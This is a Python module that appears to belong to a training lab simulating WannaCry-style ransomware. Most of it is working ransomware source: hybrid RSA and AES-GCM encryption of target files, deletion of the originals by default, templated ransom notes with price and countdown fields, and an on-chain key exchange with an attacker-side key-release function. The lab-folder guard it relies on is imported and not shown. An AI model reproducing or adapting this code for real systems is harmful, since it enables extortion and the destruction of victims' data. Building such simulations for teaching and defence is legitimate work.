"""The ransomware on one host: detonate, inspect, exchange, recover.

Key schemes (from the WannaCry v2 lab):

  wannacry  3-tier hybrid.  attacker_pub (in settings) seals a per-host
            victim_priv; victim_pub seals one AES-256-GCM file key; the file key
            encrypts every target. Decryption chain:
            attacker_priv -> victim_priv -> file key -> files.
  simple    2-tier.  attacker_pub seals the file key directly.

Every envelope is  MAGIC | nonce | AES-GCM(ciphertext+tag)  with the host id
and the original path as associated data, so the GCM tag alone proves a file
came back intact (no baseline needed).

The exchange: ``request_blob()`` is what goes on-chain (inert without
attacker_priv). The attacker's ``release()`` answers it; ``accept()`` turns the
answer into the file key.
"""

import json
import os
from pathlib import Path

from software.core import events, guard as yom_guard, settings
from software.ransomware.runtime import crypto
from software.ransomware.runtime.targets import TargetRules

PIECE = "ransomware"
ATTACKER_PIECE = "ransomware_attacker"
SCHEMES = ("wannacry", "simple")

PREPARED, ENCRYPTED, GRANTED, RECOVERED = "PREPARED", "ENCRYPTED", "KEY GRANTED", "RECOVERED"


class Ransomware:
    def __init__(self, cfg: dict = None, base: Path = None):
        self.base = base
        self.cfg = cfg if cfg is not None else settings.load(PIECE, base)
        if self.cfg["scheme"] not in SCHEMES:
            raise ValueError(f"unknown key scheme {self.cfg['scheme']}")
        self.rules = TargetRules.from_settings(self.cfg)
        self.state_dir = settings.state_dir(PIECE, base)
        self.keylog_path = self.state_dir / "keylog.json"
        self.request_path = self.state_dir / "exchange_request.json"
        self.reply_path = self.state_dir / "exchange_reply.json"
        self.accepted_path = self.state_dir / "accepted.json"
        self.status_path = self.state_dir / "status.json"
        self.magic = self.cfg["magic"].encode("ascii")
        self.participant_id = settings.host(base).get("host", "lab-host")

    # ---- small helpers ----------------------------------------------------------
    @property
    def family(self) -> str:
        return self.cfg.get("family", "Ransomware")

    @property
    def suffix(self) -> str:
        return self.cfg["suffix"]

    def guard(self):
        return yom_guard.load(self.base)

    def emit(self, event, **fields):
        return events.emit(event, piece=PIECE, base=self.base, **fields)

    def state(self) -> str:
        if self.status_path.exists():
            return json.loads(self.status_path.read_text(encoding="utf-8"))["state"]
        return ENCRYPTED if self.keylog_path.exists() else PREPARED

    def _set_state(self, state: str):
        crypto.write_json(self.status_path, {"state": state})

    def keylog(self) -> dict:
        if not self.keylog_path.exists():
            raise ValueError(
                "no keylog yet: the ransomware has not run on this host "
                f"(trigger it with: {self.cfg['commands']['detonate']})"
            )
        return json.loads(self.keylog_path.read_text(encoding="utf-8"))

    def _context(self, original: Path) -> bytes:
        return f"{self.participant_id}/{original}".encode("utf-8")

    # ---- the note -----------------------------------------------------------------
    def note_text(self, price_text: str = "", chain_id="") -> str:
        from string import Template

        note = self.cfg.get("note") or {}
        folders = ", ".join(str(f) for f in self.rules.folders)
        values = {
            "family": self.family, "suffix": self.suffix, "folders": folders,
            "folder": str(self.rules.folders[0]),
            "menu_cmd": self.cfg["commands"]["menu"],
            "decrypt_cmd": self.cfg["commands"]["decrypt"],
            "price": price_text, "chain_id": chain_id,
            "countdown_hours": self.cfg.get("countdown_hours") or "",
        }
        return Template(note.get("text", "")).safe_substitute(values)

    def write_notes(self, price_text: str = "", chain_id="") -> list:
        note = self.cfg.get("note") or {}
        name = note.get("filename")
        if not name:
            return []
        written = []
        text = self.note_text(price_text, chain_id)
        for folder in self.rules.folders:
            if folder.is_dir() and self.guard().folder_allowed(folder):
                path = folder / name
                if not path.exists():
                    crypto.write_atomic(path, text.encode("utf-8"), mode=0o644)
                    written.append(path)
        return written

    # ---- detonation -------------------------------------------------------------
    def detonate(self) -> dict:
        """Encrypt every target once. Refuses outside marked lab folders."""
        if self.keylog_path.exists():
            self.emit("already_encrypted")
            return self.keylog()
        targets = self.rules.collect(self.guard())
        attacker_pub_pem = self.cfg["attacker_pub_pem"].encode("ascii")
        attacker_pub = crypto.load_pub_pem(attacker_pub_pem)
        file_key = crypto.new_file_key()

        record = {
            "participant_id": self.participant_id,
            "scheme": self.cfg["scheme"],
            "attacker_pub_pem": attacker_pub_pem.decode("ascii"),
            "suffix": self.suffix,
            "files": [],
        }
        if self.cfg["scheme"] == "wannacry":
            victim_priv = crypto.new_rsa_keypair()
            record["victim_pub_pem"] = crypto.pub_pem(victim_priv.public_key()).decode("ascii")
            record["victim_priv_sealed"] = crypto.seal_with_rsa_pub(
                attacker_pub, crypto.priv_pem_from(victim_priv))
            record["file_key_sealed"] = crypto.seal_with_rsa_pub(victim_priv.public_key(), file_key)
            del victim_priv
        else:
            record["file_key_sealed"] = crypto.seal_with_rsa_pub(attacker_pub, file_key)

        record["files"] = [str(p) for p in targets]
        crypto.write_json(self.keylog_path, record, private=True)

        for path in targets:
            data = path.read_bytes()
            mode = path.stat().st_mode & 0o777
            nonce, ciphertext = crypto.encrypt_blob(file_key, data, self._context(path))
            # WannaCry fidelity: the ciphertext lands under <name><suffix> and,
            # unless configured otherwise, the plaintext original is removed.
            envelope = Path(str(path) + self.suffix)
            crypto.write_atomic(envelope, self.magic + nonce + ciphertext, mode=mode)
            _same_owner(envelope, path)
            if self.cfg.get("delete_originals", True):
                path.unlink(missing_ok=True)
        del file_key
        self._set_state(ENCRYPTED)
        self.emit("encrypted", files=len(targets), scheme=self.cfg["scheme"], suffix=self.suffix)
        return record

    # ---- inspection (read-only) -------------------------------------------------
    def inspect(self) -> dict:
        """Observe the target folders without changing files."""
        observations = {}
        guard = self.guard()
        seen = set()
        for envelope in self.rules.envelopes(guard):
            original = Path(str(envelope)[: -len(self.suffix)])
            seen.add(original)
            name = self.rules.display_name(original)
            try:
                if original.is_file() and not original.is_symlink():
                    status = f"INCONSISTENT — both plaintext and {self.suffix} envelope exist"
                elif envelope.read_bytes().startswith(self.magic):
                    status = f"ENCRYPTED ({self.suffix}) — ransomware envelope present"
                else:
                    status = f"ENCRYPTED ({self.suffix}) — UNEXPECTED FORMAT"
            except OSError as error:
                status = f"UNREADABLE — {error}"
            observations[name] = status
        for path in self.rules.collect(guard):
            if path in seen:
                continue
            observations[self.rules.display_name(path)] = "ORIGINAL — not encrypted"
        if self.keylog_path.exists():
            for original in map(Path, self.keylog()["files"]):
                envelope = Path(str(original) + self.suffix)
                if not original.exists() and not envelope.exists():
                    observations[self.rules.display_name(original)] = "MISSING"
        return dict(sorted(observations.items()))

    # ---- the exchange (victim side) ---------------------------------------------
    def request(self) -> dict:
        """What goes on-chain: inert without attacker_priv."""
        keylog = self.keylog()
        request = {
            "participant_id": keylog["participant_id"],
            "scheme": keylog["scheme"],
            "attacker_pub_fingerprint": crypto.fingerprint(keylog["attacker_pub_pem"]),
        }
        if keylog["scheme"] == "wannacry":
            request["victim_priv_sealed"] = keylog["victim_priv_sealed"]
        else:
            request["file_key_sealed"] = keylog["file_key_sealed"]
        return request

    def save_request(self) -> dict:
        request = self.request()
        crypto.write_json(self.request_path, request, private=True)
        return request

    @staticmethod
    def request_blob(request: dict) -> bytes:
        return json.dumps(request, sort_keys=True).encode("utf-8")

    def accept(self, reply: dict) -> bytes:
        """Turn the attacker's reply into the file key (and save it)."""
        keylog = self.keylog()
        if keylog["scheme"] == "wannacry":
            if "victim_priv_pem" not in reply:
                raise ValueError("reply carries no victim key; nothing to accept")
            victim_priv = crypto.load_priv_pem(reply["victim_priv_pem"].encode("ascii"))
            expected = crypto.load_pub_pem(keylog["victim_pub_pem"].encode("ascii"))
            if expected.public_numbers() != victim_priv.public_key().public_numbers():
                raise ValueError("recovered victim key does not match this keylog")
            file_key = crypto.unseal_with_rsa_priv(victim_priv, keylog["file_key_sealed"])
        else:
            if "file_key_b64" not in reply:
                raise ValueError("reply carries no file key; nothing to accept")
            file_key = crypto.unb64(reply["file_key_b64"])
        crypto.write_json(self.accepted_path, {"file_key_b64": crypto.b64(file_key)}, private=True)
        self._set_state(GRANTED)
        self.emit("key_granted", scheme=keylog["scheme"])
        return file_key

    # ---- recovery -----------------------------------------------------------------
    def recover(self, file_key: bytes, echo=print) -> int:
        """Decrypt every envelope; write nothing unless ALL tags verify."""
        keylog = self.keylog()
        if len(file_key) != 32:
            raise ValueError(f"expected a 32-byte AES-256 key (got {len(file_key)} bytes)")
        envelopes = [Path(p + self.suffix) for p in keylog["files"]]
        envelopes = [e for e in envelopes if e.exists()]
        plain = []
        header = len(self.magic)
        for envelope in envelopes:
            original = Path(str(envelope)[: -len(self.suffix)])
            echo(f"  decrypting {self.rules.display_name(original)}...", end="", flush=True)
            data = envelope.read_bytes()
            if not data.startswith(self.magic):
                raise ValueError(f"not a {self.family} envelope: {envelope}")
            nonce = data[header:header + crypto.NONCE_SIZE]
            body = data[header + crypto.NONCE_SIZE:]
            plain.append((original, envelope,
                          crypto.decrypt_blob(file_key, nonce, body, self._context(original))))
            echo(" integrity verified (AES-GCM)")
        for original, envelope, data in plain:
            crypto.write_atomic(original, data, mode=envelope.stat().st_mode & 0o777)
            _same_owner(original, envelope)
            # Restore the original name by removing the ransomware envelope.
            envelope.unlink(missing_ok=True)
        if plain:
            self._set_state(RECOVERED)
            self.emit("decrypted", files=len(plain))
        echo(f"{keylog['participant_id']}: {len(plain)} documents recovered and verified")
        return len(plain)


def _same_owner(path: Path, like: Path):
    """Give ``path`` the owner of ``like`` (best effort; needs root)."""
    try:
        st = like.stat()
        os.chown(path, st.st_uid, st.st_gid)
    except OSError:
        pass


# ---- the attacker side ------------------------------------------------------------

def release(attacker: dict, blob: bytes) -> bytes:
    """Answer one on-chain request with attacker_priv (runs on the attacker host)."""
    request = json.loads(blob.decode("utf-8"))
    if request.get("attacker_pub_fingerprint") != crypto.fingerprint(attacker["attacker_pub_pem"]):
        raise ValueError("request was sealed under a different attacker key")
    attacker_priv = crypto.load_priv_pem(crypto.unb64(attacker["attacker_priv_pem_b64"]))
    if request.get("scheme", "wannacry") == "wannacry":
        victim_priv_pem = crypto.unseal_with_rsa_priv(attacker_priv, request["victim_priv_sealed"])
        reply = {"scheme": "wannacry", "participant_id": "",
                 "victim_priv_pem": victim_priv_pem.decode("ascii")}
    else:
        file_key = crypto.unseal_with_rsa_priv(attacker_priv, request["file_key_sealed"])
        reply = {"scheme": "simple", "participant_id": "", "file_key_b64": crypto.b64(file_key)}
    return json.dumps(reply).encode("utf-8")
